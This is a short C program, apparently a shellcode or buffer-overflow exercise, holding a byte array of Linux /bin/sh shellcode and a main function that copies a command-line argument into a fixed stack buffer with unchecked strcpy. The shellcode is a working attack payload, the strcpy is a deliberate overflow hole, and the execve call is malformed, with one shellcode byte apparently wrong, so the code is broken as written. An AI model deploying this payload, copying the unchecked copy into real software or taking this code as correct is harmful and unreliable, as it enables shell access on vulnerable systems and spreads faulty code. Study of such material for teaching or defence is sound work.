#include <stdio.h>
#include <stdlib.h>

const char code[] = 
"\x30\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;
int main(int argc, char** argv)
{
//char name[] = "\x30\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
char name[512];

strcpy(name,argv[1]);
execve(name[0],name,NULL);
return 0;
}


